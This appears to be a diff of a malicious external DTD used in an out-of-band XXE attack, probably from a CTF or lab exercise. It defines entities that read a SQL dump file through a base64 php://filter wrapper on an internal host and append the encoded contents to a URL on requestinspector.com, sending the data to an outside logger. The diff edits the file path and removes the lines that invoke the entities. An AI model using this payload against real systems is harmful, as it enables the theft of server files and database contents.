@@ -1,4 +1,2 @@
-<!ENTITY % payload SYSTEM " http://172.26.0.4/?file=php://filter/convert.base64-encode/resource=file:///var/www/html/dump_lalalalala.sql">
+<!ENTITY % payload SYSTEM "http://172.26.0.4/index.php?file=php://filter/read=convert.base64-encode/resource=dump_lalalalala.sql">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/inspect/baiyunkai/%payload;'>">
-%int;
-%trick;
